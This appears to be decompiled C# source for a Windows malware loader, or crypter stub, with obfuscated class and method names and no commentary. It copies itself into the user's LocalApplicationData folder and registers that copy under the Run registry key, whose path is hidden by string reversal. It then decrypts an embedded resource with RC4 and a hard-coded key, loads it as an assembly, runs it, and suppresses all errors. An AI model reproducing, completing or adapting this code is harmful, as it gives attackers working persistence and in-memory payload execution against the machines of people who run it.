using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using ns8;

namespace ns0;

internal sealed class Class0
{
	private static void Main(string[] args)
	{
		if (!Class33.smethod_4())
		{
			return;
		}
		object[] parameters = new object[0];
		int num = new Random().Next(300, 750);
		long num2 = Environment.TickCount;
		_ = Environment.TickCount - num2;
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\1.exe"))
		{
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\1.exe");
		}
		string name = smethod_0("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS");
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
		registryKey.SetValue("ABAUhaIGR0VI", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\1.exe");
		registryKey.Close();
		try
		{
			ResourceManager resourceManager = new ResourceManager("res", Assembly.GetExecutingAssembly());
			byte[] rawAssembly = smethod_1((byte[])resourceManager.GetObject("UdVh9ID4rycY4nVs"), "ZklaW476KxmexU27P6lsseMnU3esI0TCDF0nis5cZPjbvwiLvKznWyIUI7q");
			resourceManager.ReleaseAllResources();
			Assembly assembly = Assembly.Load(rawAssembly);
			if (assembly.EntryPoint!.GetParameters().Length > 0)
			{
				parameters = new object[1] { args };
			}
			assembly.EntryPoint!.Invoke(null, parameters);
		}
		catch
		{
		}
	}

	private static string smethod_0(string s)
	{
		char[] array = s.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static byte[] smethod_1(byte[] bytes, string Key)
	{
		byte[] bytes2 = Encoding.Default.GetBytes(Key);
		byte[] array = new byte[256];
		byte[] array2 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = (byte)i;
			array2[i] = bytes2[i % bytes2.GetLength(0)];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array[i] + array2[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < bytes.GetLength(0); j++)
		{
			i = (i + 1) % 256;
			num = (num + array[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
			int num2 = (array[i] + array[num]) % 256;
			bytes[j] ^= array[num2];
		}
		return bytes;
	}
}
